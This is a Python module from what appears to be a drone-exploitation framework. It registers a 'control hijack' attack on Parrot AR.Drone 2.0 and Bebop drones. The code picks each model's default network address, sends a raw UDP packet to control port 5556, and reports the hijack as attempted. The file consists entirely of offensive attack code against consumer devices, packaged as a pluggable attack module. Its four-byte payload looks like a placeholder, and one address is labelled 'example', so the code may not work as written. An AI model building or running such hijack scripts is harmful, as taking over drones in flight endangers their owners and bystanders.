import socket
from shared import Manufacturer, Model, AttackType, InterfaceMode
from modules.exploit.base_attack_script import BaseAttackScript, AttackResult, DroneTargetInfo
from modules.exploit.attack_factory import register_attack

@register_attack(
    manufacturer=Manufacturer.PARROT,
    models=[m.value for m in Model],
    attack_types=[AttackType.CONTROL_HIJACK],
)
class ControlHijackAttackParrot(BaseAttackScript):
    def attack(self) -> AttackResult:
        pre = self._ensure_interface_mode(InterfaceMode.MANAGED)
        if not pre.status: return pre

        model = self.target_info.model
        try:
            if model == Model.PARROT_AR2.value:
                addr = ("192.168.1.1", 5556)
            elif model == Model.PARROT_BEBOP.value:
                addr = ("192.168.42.1", 5556)  # example IP for Bebop
            else:
                return AttackResult(False, "", "", f"Unsupported model: {model}")

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b"\x01\x00\x00\x00", addr)
            return AttackResult(True, f"sent to {addr}", "", "Control hijack attempted")
        except Exception as e:
            return AttackResult(False, "", str(e), "Control hijack failed")
